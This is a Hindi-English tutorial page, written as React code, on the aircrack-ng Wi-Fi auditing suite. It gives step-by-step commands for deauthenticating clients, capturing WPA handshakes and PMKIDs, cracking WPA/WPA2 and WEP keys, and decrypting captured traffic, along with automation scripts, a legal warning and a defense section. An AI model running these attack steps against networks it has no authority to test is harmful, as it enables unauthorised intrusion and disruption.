import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function AircrackNg() {
  return (
    <TutorialLayout
      title="aircrack-ng"
      subtitle="वाईफाई नेटवर्क सुरक्षा मूल्यांकन का संपूर्ण सूट"
      icon="📡"
      prev={{ to: '/tools', label: 'सभी टूल्स' }}
      next={{ to: '/tool/nmap', label: 'nmap' }}
    >
      <h2>What is Aircrack-ng?</h2>
      <p>
        aircrack-ng वाईफाई नेटवर्क सुरक्षा मूल्यांकन का एक संपूर्ण सूट है जो wireless network auditing के लिए industry standard tool है। इसमें airmon-ng (मॉनिटर मोड), airodump-ng (पैकेट कैप्चर), aireplay-ng (पैकेट इंजेक्शन), और aircrack-ng (पासवर्ड क्रैकिंग) सब शामिल हैं। यह वाईफाई हैकिंग का सबसे महत्वपूर्ण टूल है जो हर एथिकल हैकर को आना चाहिए।
      </p>
      <p>
        यह टूल WEP और WPA/WPA2 वाईफाई पासवर्ड क्रैक कर सकता है। इसका काम करने का तरीका यह है कि पहले आप वाईफाई का ट्रैफिक कैप्चर करते हैं (हैंडशेक), फिर उस हैंडशेक को डिक्शनरी या ब्रूट फोर्स अटैक से क्रैक करते हैं। aircrack-ng सुइट में कई अलग-अलग टूल्स शामिल हैं जो एक साथ मिलकर वाईफाई सुरक्षा परीक्षण को संभव बनाते हैं।
      </p>
      <p>
        aircrack-ng C भाषा में लिखा गया है और Linux, macOS, Windows, Android सभी platforms पर चलता है। यह monitor mode support करने वाले wireless adapter के साथ काम करता है। Kali Linux और Nethunter में यह pre-installed आता है। यह tool WiFi security research, penetration testing, और network auditing के लिए essential है।
      </p>
      <p>
        aircrack-ng का सबसे बड़ा advantage है इसका comprehensive approach — एक ही suite में monitor mode enable करने से लेकर packet capture, packet injection, और password cracking सब कुछ मिलता है। अलग-अलग tools use करने की ज़रूरत नहीं। यह WiFi hacking का Swiss Army knife है।
      </p>
      <p>
        aircrack-ng open source (GPLv2) है और इसकी community बहुत बड़ी है। GitHub पर 4,000+ stars हैं और actively maintained है। यह tool professional penetration testers, security researchers, और network administrators सभी use करते हैं। इसके साथ hashcat integration भी possible है GPU-accelerated cracking के लिए।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> aircrack-ng केवल अपने स्वयं के नेटवर्क या अधिकृत पेनेट्रेशन टेस्टिंग में ही उपयोग करें। बिना अनुमति के वाईफाई नेटवर्क में घुसना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है।
      </div>

      <h2>History of Aircrack-ng</h2>
      <p>
        aircrack-ng की शुरुआत 2004 में Christophe Devine ने की थी। उस समय WiFi security tools बहुत limited थे और WEP cracking बहुत complex था। Christophe ने aircrack-ng को open source के रूप में release किया और यह जल्दी ही WiFi security community में standard बन गया।
      </p>
      <p>
        2006 में aircrack-ng 1.0 release हुआ जिसमें WPA/WPA2 cracking support add हुआ। यह game changer था — पहले सिर्फ WEP crack होता था, अब WPA भी। 2010 में aireplay-ng में packet injection support improve हुआ। 2015 में aircrack-ng 1.2 release हुआ जिसमें PMKID attack support add हुआ — यह बिना clients के WPA crack करने का तरीका है।
      </p>
      <p>
        आज aircrack-ng GitHub पर actively maintained है और यह Kali Linux, Parrot OS, Nethunter सभी में pre-installed आता है। यह WiFi security testing का de facto standard है। हर WiFi hacking tutorial और course में aircrack-ng use होता है।
      </p>

      <h2>How Aircrack-ng Works?</h2>
      <p>
        aircrack-ng suite कई tools से मिलकर बना है जो together WiFi hacking workflow complete करते हैं:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">airmon-ng:</strong> Wireless adapter को monitor mode में डालता है — बिना connected हुए सारा WiFi traffic capture कर सकते हो</li>
        <li><strong className="text-white">airodump-ng:</strong> WiFi networks scan करता है — SSID, BSSID, channel, encryption type, connected clients सब दिखाता है</li>
        <li><strong className="text-white">aireplay-ng:</strong> Packet injection करता है — deauthentication attack, fake authentication, ARP replay</li>
        <li><strong className="text-white">aircrack-ng:</strong> Captured handshake को dictionary या brute force से crack करता है</li>
        <li><strong className="text-white">airdecap-ng:</strong> Captured traffic को decrypt करता है password मिलने के बाद</li>
        <li><strong className="text-white">airbase-ng:</strong> Fake access point बनाता है — evil twin attack के लिए</li>
        <li><strong className="text-white">airolib-ng:</strong> PMK (Pairwise Master Key) database manage करता है — pre-computed tables</li>
        <li><strong className="text-white">packetforge-ng:</strong> Custom packets बनाता है injection के लिए</li>
      </ul>
      <p>
        WiFi hacking workflow यह है — पहले airmon-ng से monitor mode enable करो, फिर airodump-ng से target network identify करो, फिर aireplay-ng से deauthentication attack करो (clients disconnect करने के लिए), फिर handshake capture करो, और finally aircrack-ng से password crack करो। यह process step-by-step है और हर step important है।
      </p>

      <h2>Installation</h2>
      <p>
        aircrack-ng Kali Linux और Nethunter में pre-installed आता है। अगर किसी कारण से नहीं है तो कई तरीकों से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Aircrack-ng Installation"
        code={`# Kali/Nethunter में pre-installed:
sudo apt update
sudo apt install aircrack-ng

# सोर्स से (latest version):
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure --with-experimental
make
sudo make install

# वर्जन चेक:
aircrack-ng --version

# सभी tools list करें:
which airmon-ng airodump-ng aireplay-ng aircrack-ng airdecap-ng

# Wireless adapter check:
iwconfig

# Monitor mode capable adapter ज़रूरी है:
# Alfa AWUS036ACH, TP-Link TL-WN722N v1 recommended`}
      />

      <h2>Basic Usage</h2>
      <p>
        aircrack-ng suite use करने के लिए wireless adapter को monitor mode में डालना पहला step है। फिर target network scan करो, handshake capture करो, और crack करो।
      </p>
      <CodeBlock
        title="WiFi Hacking Workflow"
        code={`# Step 1: Monitor mode enable करें:
sudo airmon-ng start wlan0

# Step 2: WiFi networks scan करें:
sudo airodump-ng wlan0mon

# Step 3: Target network का BSSID और Channel नोट करें:
# BSSID: AA:BB:CC:DD:EE:FF
# Channel: 6
# ESSID: TargetWiFi

# Step 4: Specific channel पर capture start करें:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 5: Deauthentication attack (clients disconnect):
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 6: Handshake capture होने पर terminal में दिखेगा:
# WPA handshake: AA:BB:CC:DD:EE:FF

# Step 7: Dictionary attack से crack करें:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Step 8: Monitor mode disable करें:
sudo airmon-ng stop wlan0mon`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool/Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">airmon-ng start wlan0</td><td className="py-2 px-3">Monitor mode enable करें</td><td className="py-2 px-3 font-mono text-xs">sudo airmon-ng start wlan0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">airodump-ng wlan0mon</td><td className="py-2 px-3">WiFi networks scan करें</td><td className="py-2 px-3 font-mono text-xs">sudo airodump-ng wlan0mon</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c channel</td><td className="py-2 px-3">Specific channel scan करें</td><td className="py-2 px-3 font-mono text-xs">-c 6</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--bssid MAC</td><td className="py-2 px-3">Specific AP filter करें</td><td className="py-2 px-3 font-mono text-xs">--bssid AA:BB:CC:DD:EE:FF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w file</td><td className="py-2 px-3">Capture file save करें</td><td className="py-2 px-3 font-mono text-xs">-w capture</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--deauth N</td><td className="py-2 px-3">N deauth packets भेजें</td><td className="py-2 px-3 font-mono text-xs">--deauth 10</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w wordlist</td><td className="py-2 px-3">Dictionary file specify करें</td><td className="py-2 px-3 font-mono text-xs">-w rockyou.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-b BSSID</td><td className="py-2 px-3">Target AP specify करें</td><td className="py-2 px-3 font-mono text-xs">-b AA:BB:CC:DD:EE:FF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-J file</td><td className="py-2 px-3">Hashcat format output</td><td className="py-2 px-3 font-mono text-xs">-J hashcat_file</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--ivs</td><td className="py-2 px-3">IVs only capture (WEP)</td><td className="py-2 px-3 font-mono text-xs">--ivs</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-a client</td><td className="py-2 px-3">Specific client target</td><td className="py-2 px-3 font-mono text-xs">-c 11:22:33:44:55:66</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-e ESSID</td><td className="py-2 px-3">Network name specify करें</td><td className="py-2 px-3 font-mono text-xs">-e TargetWiFi</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--update N</td><td className="py-2 px-3">Display update interval (seconds)</td><td className="py-2 px-3 font-mono text-xs">--update 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-N</td><td className="py-2 px-3">Don't probe APs (stealth)</td><td className="py-2 px-3 font-mono text-xs">-N</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--manufacturer</td><td className="py-2 px-3">Manufacturer name दिखाएं</td><td className="py-2 px-3 font-mono text-xs">--manufacturer</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Monitor Mode</h2>
      <p>
        Monitor mode WiFi hacking का पहला और सबसे important step है। Normal mode में adapter सिर्फ connected network का traffic देखता है, लेकिन monitor mode में सभी channels का सारा traffic capture कर सकता है।
      </p>
      <CodeBlock
        title="Monitor Mode Setup"
        code={`# Monitor mode enable करें:
sudo airmon-ng start wlan0

# यह wlan0 को wlan0mon में बदल देगा
# Check करें:
iwconfig wlan0mon
# Mode: Monitor दिखना चाहिए

# पहले interfering processes kill करें:
sudo airmon-ng check kill
# NetworkManager, wpa_supplicant बंद होंगे

# फिर monitor mode enable करें:
sudo airmon-ng start wlan0

# Manual monitor mode (अगर airmon-ng काम न करे):
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Monitor mode disable करें (normal mode):
sudo airmon-ng stop wlan0mon

# NetworkManager restart करें:
sudo systemctl start NetworkManager

# Troubleshooting:
# अगर "Device or resource busy" error आए:
sudo airmon-ng check kill
# फिर try करो

# Adapter capabilities check:
iw list | grep -A 10 "Supported interface modes"
# monitor mode support दिखना चाहिए`}
      />

      <h2>Deauthentication Attack</h2>
      <p>
        Deauthentication attack से clients को WiFi network से disconnect कर सकते हो। जब client reconnect करता है, तो WPA handshake capture होता है जिसे crack करके password मिलता है।
      </p>
      <CodeBlock
        title="Deauthentication Attack"
        code={`# सभी clients disconnect करें (broadcast):
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# सिर्फ specific client disconnect करें:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 10 deauth packets भेजें:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Continuous deauth (jab tak Ctrl+C न दबाओ):
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# दूसरा तरीका — mdk3:
sudo mdk3 wlan0mon d -B AA:BB:CC:DD:EE:FF

# तीसरा तरीका — mdk4:
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Deauth + handshake capture (एक साथ):
# Terminal 1: Capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Terminal 2: Deauth
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# PMKID capture (बिना deauth):
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o pmkid.pcapng`}
      />

      <h2>Handshake Capture</h2>
      <p>
        WPA/WPA2 handshake capture करना cracking का essential step है। Handshake तब capture होता है जब client AP से authenticate करता है।
      </p>
      <CodeBlock
        title="Handshake Capture Techniques"
        code={`# Method 1: Passive capture (wait करें):
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# जब कोई client connect करेगा, handshake auto capture होगा

# Method 2: Active deauth (तुरंत):
# Step A: Capture start करें:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step B: Deauth भेजें (दूसरे terminal में):
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF wlan0mon

# Handshake confirm करें:
aircrack-ng capture-01.cap
# "1 handshake found" दिखना चाहिए

# Method 3: PMKID attack (बिना client):
# यह नया तरीका है — client की ज़रूरत नहीं:
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o capture.pcapng

# Method 4: Evil twin + captive portal:
# Fake AP बनाओ → client connect होगा → handshake capture

# Handshake validation:
# Wireshark में open करो:
# filter: eapol
# 4 EAPOL frames दिखने चाहिए (Message 1-4)`}
      />

      <h2>WPA/WPA2 Cracking</h2>
      <p>
        Handshake capture करने के बाद password crack करने के कई तरीके हैं — dictionary attack, brute force, और GPU-accelerated cracking।
      </p>
      <CodeBlock
        title="WPA/WPA2 Cracking Methods"
        code={`# Method 1: Dictionary attack (सबसे common):
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Method 2: Custom wordlist:
# CeWL से website-based wordlist बनाओ:
cewl https://target.com -d 2 -m 5 -w custom_wordlist.txt
aircrack-ng -w custom_wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Method 3: Crunch से wordlist generate करें:
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Method 4: Hashcat से GPU cracking (fastest):
# पहले hashcat format में convert करें:
aircrack-ng -J hashcat_file capture-01.cap
# फिर hashcat से crack करें:
hashcat -m 22000 hashcat_file.hc22000 /usr/share/wordlists/rockyou.txt

# Method 5: John the Ripper:
# Convert करें:
aircrack-ng capture-01.cap -j john_file
# Crack करें:
john --wordlist=/usr/share/wordlists/rockyou.txt john_file

# Method 6: Online databases:
# https://gpuhash.net — GPU cloud cracking
# https://crackstation.net — pre-computed tables

# Method 7: Rules-based attack (hashcat):
hashcat -m 22000 hashcat_file.hc22000 rockyou.txt -r rules/best64.rule

# Method 8: Mask attack (brute force with patterns):
hashcat -m 22000 hashcat_file.hc22000 -a 3 ?d?d?d?d?d?d?d?d`}
      />

      <h2>WEP Cracking</h2>
      <p>
        WEP (Wired Equivalent Privacy) बहुत कमज़ोर encryption है जो minutes में crack हो जाता है। आजकल ज़्यादातर networks WPA2 use करते हैं, लेकिन कुछ पुराने devices अभी भी WEP use करते हैं।
      </p>
      <CodeBlock
        title="WEP Cracking"
        code={`# Step 1: Monitor mode:
sudo airmon-ng start wlan0

# Step 2: Target WEP network scan करें:
sudo airodump-ng wlan0mon
# WEP encrypted network identify करें

# Step 3: IVs capture करें:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --ivs -w wep_capture wlan0mon

# Step 4: ARP replay attack (IVs तेज़ी से collect):
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: Fake authentication:
sudo aireplay-ng -1 0 -e TargetWEP -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Step 6: Crack (40,000+ IVs चाहिए):
aircrack-ng wep_capture-01.ivs

# WEP typically 5-10 minutes में crack हो जाता है
# 128-bit WEP के लिए ज़्यादा IVs चाहिए

# WEP Attack Techniques:
# 1. ARP Replay — सबसे fast IV generation
# 2. Fragmentation — key recovery
# 3. ChopChop — WEP key recovery
# 4. Cafe Latte — client attack
# 5. Hirte — client attack (advanced)

# WEP cracking success rate: 99%+ (within minutes)`}
      />

      <h2>Airodump-ng Detailed Guide</h2>
      <p>
        airodump-ng WiFi scanning और packet capture का primary tool है। यह सभी nearby WiFi networks की detailed information दिखाता है — SSID, BSSID, channel, encryption, signal strength, connected clients सब।
      </p>
      <CodeBlock
        title="Airodump-ng Advanced Usage"
        code={`# Basic scan — सभी networks:
sudo airodump-ng wlan0mon

# Specific channel पर scan:
sudo airodump-ng -c 6 wlan0mon

# Specific AP filter:
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Output formats:
sudo airodump-ng -w capture --output-format pcap,csv,airodump wlan0mon

# GPS coordinates (अगर GPS है):
sudo airodump-ng --gpsd wlan0mon

# Manufacturer info:
sudo airodump-ng --manufacturer wlan0mon

# 5GHz band scan:
sudo airodump-ng --band a wlan0mon

# Both bands:
sudo airodump-ng --band abg wlan0mon

# WPS info display:
sudo airodump-ng --wps wlan0mon

# Filter by encryption:
sudo airodump-ng --encrypt WPA2 wlan0mon

# Display update interval:
sudo airodump-ng --update 3 wlan0mon

# Output columns explanation:
# BSSID — Access Point MAC address
# PWR — Signal strength (higher = closer)
# Beacons — Number of beacon frames
# #Data — Number of data frames
# #/s — Data frames per second
# CH — Channel number
# MB — Maximum speed
# ENC — Encryption type (WPA2, WEP, OPN)
# CIPHER — Cipher (CCMP, TKIP)
# AUTH — Authentication (PSK, MGT)
# ESSID — Network name`}
      />

      <h2>Aireplay-ng Attack Types</h2>
      <p>
        aireplay-ng packet injection tool है जो कई तरह के attacks support करता है। हर attack का अपना use case है।
      </p>
      <CodeBlock
        title="Aireplay-ng Attack Reference"
        code={`# Attack Type 0: Deauthentication
# Clients को network से disconnect करो:
sudo aireplay-ng --deauth 0 -a AP_MAC wlan0mon
# Specific client:
sudo aireplay-ng --deauth 0 -a AP_MAC -c CLIENT_MAC wlan0mon

# Attack Type 1: Fake Authentication
# AP से fake association बनाओ (WEP के लिए):
sudo aireplay-ng -1 0 -e TargetSSID -a AP_MAC -h YOUR_MAC wlan0mon

# Attack Type 2: Interactive Packet Replay
# Capture packets और replay करो:
sudo aireplay-ng -2 -b AP_MAC -h YOUR_MAC wlan0mon

# Attack Type 3: ARP Replay
# ARP packets replay करके IVs generate करो (WEP):
sudo aireplay-ng -3 -b AP_MAC -h YOUR_MAC wlan0mon

# Attack Type 4: KoreK ChopChop
# WEP key recovery attack:
sudo aireplay-ng -4 -b AP_MAC -h YOUR_MAC wlan0mon

# Attack Type 5: Fragmentation
# Key stream recovery:
sudo aireplay-ng -5 -b AP_MAC -h YOUR_MAC wlan0mon

# Attack Type 9: Injection Test
# Adapter injection capability test:
sudo aireplay-ng -9 wlan0mon
# Specific AP test:
sudo aireplay-ng -9 -a AP_MAC wlan0mon

# Attack Type 7: Continue
# Fragments collect करो:
sudo aireplay-ng -7 -b AP_MAC -h YOUR_MAC wlan0mon`}
      />

      <h2>Airdecap-ng Decryption</h2>
      <p>
        airdecap-ng captured traffic को decrypt करता है जब password मिल जाता है। इससे actual data packets देख सकते हो।
      </p>
      <CodeBlock
        title="Traffic Decryption"
        code={`# WPA/WPA2 traffic decrypt:
airdecap-ng -e TargetSSID -p password123 capture-01.cap

# Output: capture-01-dec.cap (decrypted file)
# Wireshark में open करो:
wireshark capture-01-dec.cap

# WEP traffic decrypt:
airdecap-ng -w WEP_KEY capture-01.cap

# Statistics:
airdecap-ng -e TargetSSID -p password123 capture-01.cap
# Output shows:
# - Total packets read
# - WPA/WPA2 decrypted packets
# - WEP decrypted packets
# - Output file name

# Decrypted traffic analysis:
# HTTP requests देख सकते हो
# DNS queries देख सकते हो
# Unencrypted data extract कर सकते हो
# URLs visit किए गए देख सकते हो`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated WiFi Audit"
        code={`#!/bin/bash
# WiFi Security Audit Script

INTERFACE="wlan0"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] WiFi Security Audit Starting..."

# Monitor mode:
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE
MONITOR="\${INTERFACE}mon"

echo "[+] Monitor mode enabled: $MONITOR"

# Scan for 30 seconds:
echo "[*] Scanning networks for 30 seconds..."
timeout 30 sudo airodump-ng $MONITOR -w /tmp/scan --output-format csv
echo "[+] Scan complete. Results in /tmp/scan-01.csv"

# Parse results:
echo "[*] Target networks found:"
grep "WPA" /tmp/scan-01.csv | awk -F',' '{print $1, $4, $14}'

echo ""
echo "[!] Manual steps required:"
echo "    1. Select target BSSID and channel"
echo "    2. Run: sudo airodump-ng -c CHANNEL --bssid BSSID -w capture $MONITOR"
echo "    3. Run: sudo aireplay-ng --deauth 5 -a BSSID $MONITOR"
echo "    4. Run: aircrack-ng -w $WORDLIST -b BSSID capture-01.cap"`}
      />

      <CodeBlock
        title="Hashcat Integration Script"
        code={`#!/bin/bash
# Aircrack-ng + Hashcat combo script

CAPTURE=$1
BSSID=$2
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Converting capture to hashcat format..."
aircrack-ng -J /tmp/hashcat_file "$CAPTURE"

echo "[*] Starting GPU cracking..."
hashcat -m 22000 /tmp/hashcat_file.hc22000 $WORDLIST --force

echo "[*] Results:"
hashcat -m 22000 /tmp/hashcat_file.hc22000 --show`}
      />

      <CodeBlock
        title="Batch WiFi Scanner"
        code={`#!/bin/bash
# Batch WiFi scanner — all networks + handshake capture

MONITOR="wlan0mon"
OUTPUT_DIR="/tmp/wifi_audit"
mkdir -p $OUTPUT_DIR

# Scan all networks:
echo "[*] Scanning WiFi networks..."
timeout 60 sudo airodump-ng $MONITOR -w $OUTPUT_DIR/scan --output-format csv

# Parse WPA networks:
echo "[+] WPA Networks found:"
grep "WPA" $OUTPUT_DIR/scan-01.csv | while IFS=',' read -r bssid _ _ _ _ channel _ _ _ _ _ _ _ essid; do
    echo "    ESSID: $essid | BSSID: $bssid | Channel: $channel"
done

echo ""
echo "[*] To capture handshake for specific network:"
echo "    sudo airodump-ng -c CHANNEL --bssid BSSID -w $OUTPUT_DIR/capture $MONITOR"`}
      />

      <h2>aircrack-ng vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">aircrack-ng</th>
              <th className="text-left py-2 px-3 text-neon-green">Wifite2</th>
              <th className="text-left py-2 px-3 text-neon-green">Bettercap</th>
              <th className="text-left py-2 px-3 text-neon-green">Hashcat</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Interface</td><td className="py-2 px-3">CLI (manual steps)</td><td className="py-2 px-3">CLI (automated)</td><td className="py-2 px-3">Interactive CLI</td><td className="py-2 px-3">CLI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WEP Cracking</td><td className="py-2 px-3">हाँ (excellent)</td><td className="py-2 px-3">हाँ (automated)</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPA/WPA2</td><td className="py-2 px-3">हाँ (handshake)</td><td className="py-2 px-3">हाँ (automated)</td><td className="py-2 px-3">हाँ (PMKID)</td><td className="py-2 px-3">हाँ (GPU)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPS Attack</td><td className="py-2 px-3">नहीं (Reaver use)</td><td className="py-2 px-3">हाँ (built-in)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Deauth Attack</td><td className="py-2 px-3">हाँ (aireplay-ng)</td><td className="py-2 px-3">हाँ (automated)</td><td className="py-2 px-3">हाँ (wifi.deauth)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">PMKID Attack</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GPU Cracking</td><td className="py-2 px-3">नहीं (CPU only)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (fastest)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Automation</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">Full auto</td><td className="py-2 px-3">Semi-auto</td><td className="py-2 px-3">Scriptable</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Detailed manual testing</td><td className="py-2 px-3">Quick automated audit</td><td className="py-2 px-3">MITM + WiFi combo</td><td className="py-2 px-3">Password cracking</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Monitor mode enable नहीं हो रहा', a: 'Adapter monitor mode support नहीं करता। Internal WiFi cards ज़्यादातर support नहीं करते। External USB adapter use करो — Alfa AWUS036ACH या TP-Link TL-WN722N v1 recommended हैं।' },
          { q: 'Handshake capture नहीं हो रहा', a: 'Deauthentication attack use करो clients disconnect करने के लिए। अगर कोई client connected नहीं है तो PMKID attack try करो (hcxdumptool)। Channel match check करो।' },
          { q: 'aircrack-ng crack नहीं कर पा रहा', a: 'Wordlist में password नहीं है। बड़ा wordlist use करो या crunch से generate करो। GPU cracking के लिए hashcat use करो — बहुत तेज़ है।' },
          { q: 'Packet injection काम नहीं कर रही', a: 'Adapter injection support check करो: aireplay-ng -9 wlan0mon। कुछ adapters injection support नहीं करते। Driver issue हो सकता है — external adapter use करो।' },
          { q: 'WiFi adapter detect नहीं हो रहा', a: 'lsusb command से check करो adapter connected है या नहीं। Driver install करो — Realtek adapters के लिए specific drivers चाहिए। VirtualBox/VMware में USB passthrough enable करो।' },
          { q: 'Channel hopping हो रहा है', a: 'airodump-ng में -c flag से specific channel lock करो: airodump-ng -c 6 wlan0mon। अगर channel hop हो रहा है तो capture incomplete होगा।' },
          { q: 'NetworkManager interfere कर रहा है', a: 'sudo airmon-ng check kill करो — यह NetworkManager, wpa_supplicant बंद कर देगा। काम खत्म होने पर sudo systemctl start NetworkManager करो।' },
          { q: 'WPA3 crack हो सकता है?', a: 'WPA3 (SAE) अभी तक practical attack नहीं है। Dragonblood vulnerability theoretical है लेकिन real-world में काम नहीं करता। WPA2 target करो।' },
          { q: 'Capture file corrupt हो गया', a: 'airodump-ng को properly stop करो (Ctrl+C)। अगर file corrupt है तो नया capture करो। Mergecap से multiple captures merge कर सकते हो।' },
          { q: 'Signal strength बहुत कम है', a: 'Target AP के physically close जाओ। High-gain antenna वाला adapter use करो (Alfa AWUS036ACH)। अगर signal -70 dBm से कम है तो capture अच्छा नहीं होगा।' },
          { q: 'PMKID capture नहीं हो रहा', a: 'सभी APs PMKID support नहीं करते। hcxdumptool latest version use करो। Filter list check करो — target.txt में सही BSSID हो। Adapter monitor mode properly set हो।' },
          { q: 'Cracking बहुत slow है', a: 'CPU cracking slow है — hashcat GPU use करो। Wordlist optimize करो — unnecessary passwords हटाओ। Rules-based attack try करो: hashcat -r rules/best64.rule। Mask attack से targeted brute force करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        aircrack-ng attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WPA3 Use करें:</strong> SAE (Simultaneous Authentication of Equals) — handshake capture crack नहीं होगा</li>
        <li><strong className="text-white">Strong Password:</strong> 12+ characters, uppercase, lowercase, numbers, symbols — dictionary attack fail होगा</li>
        <li><strong className="text-white">802.11w (PMF):</strong> Protected Management Frames — deauthentication attack block होगा</li>
        <li><strong className="text-white">WPS Disable करें:</strong> WPS PIN attack से बचने के लिए router settings में WPS off करो</li>
        <li><strong className="text-white">Rogue AP Detection:</strong> Wireless IDS/IPS deploy करो — evil twin detect होगा</li>
        <li><strong className="text-white">MAC Address Filtering:</strong> Known devices के MAC addresses whitelist करो (limited protection)</li>
        <li><strong className="text-white">Network Segmentation:</strong> Guest network अलग रखो — compromise होने पर internal network safe</li>
        <li><strong className="text-white">Monitor Wireless Logs:</strong> Deauthentication flood detect करो — यह attack का sign है</li>
        <li><strong className="text-white">RADIUS Authentication:</strong> WPA2-Enterprise use करो — per-user credentials, handshake cracking useless</li>
        <li><strong className="text-white">Wireless IDS/IPS:</strong> Kismet, Snort wireless rules — deauth flood, evil twin, rogue AP detect होगा</li>
